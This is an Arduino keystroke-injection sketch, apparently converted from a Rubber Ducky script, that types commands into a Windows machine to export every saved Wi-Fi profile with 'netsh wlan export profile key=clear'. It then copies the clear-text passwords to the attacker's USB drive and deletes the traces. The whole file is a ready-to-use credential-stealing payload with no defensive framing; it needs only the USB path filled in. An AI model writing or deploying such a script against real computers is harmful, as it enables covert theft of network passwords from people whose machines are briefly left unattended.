// Generated with <3 by Dckuino.js !

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Code Begins Here

  // ---THIS SCRIPT IS CREATED BY NicoAndCode---
  // ---THIS SCRIPT CREATES A FOLDER WITH INSIDE THE FILES CONTAINING THE PASSWORDS OF EVERY WI FI NETWORK TO
 // WHICH THE COMPUTER IS CONNECTED---
  
  delay(1500);

REM  ---//**CHANGE THE FILE PATH OF YOUR USB (C:\> , E:\> , F:\> ...**//---


  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  Keyboard.print("cmd");

  delay(100);

  typeKey(KEY_RETURN);

  delay(500);

  // ---MOVE TO MAIN DRIVE (C:\>)---
  Keyboard.print("cd /");

  typeKey(KEY_RETURN);

  delay(250);

  // ---CREATE DIRECTORY---
  Keyboard.print("mkdir Wifi_key");

  typeKey(KEY_RETURN);

  delay(250);

  // ---MOVE TO DIRECTORY---
  Keyboard.print("cd Wifi_key");

  typeKey(KEY_RETURN);

  delay(110);

  // ---EXECUTE COMMAND---
  Keyboard.print("netsh wlan export profile key=clear");

  typeKey(KEY_RETURN);

  delay(150);

  // ---COPY FILE IN YOUR USB---
  Keyboard.print("xcopy C:\\Wifi_key YOUR USB PATH"); //<---- CHANGE  

  typeKey(KEY_RETURN);

  delay(1000);

  // ---RETURN TO MAIN DRIVE---
  Keyboard.print(" cd /");

  typeKey(KEY_RETURN);

  delay(150);

  // ---REMOVE FILE FROM PC---
  Keyboard.print("del C:\\Wifi_key");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("S");

  typeKey(KEY_RETURN);

  delay(100);

  // ---REMOVE DIRECTORY FROM PC---
  Keyboard.print("rmdir C:\\Wifi_key");

  typeKey(KEY_RETURN);

  delay(150);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}
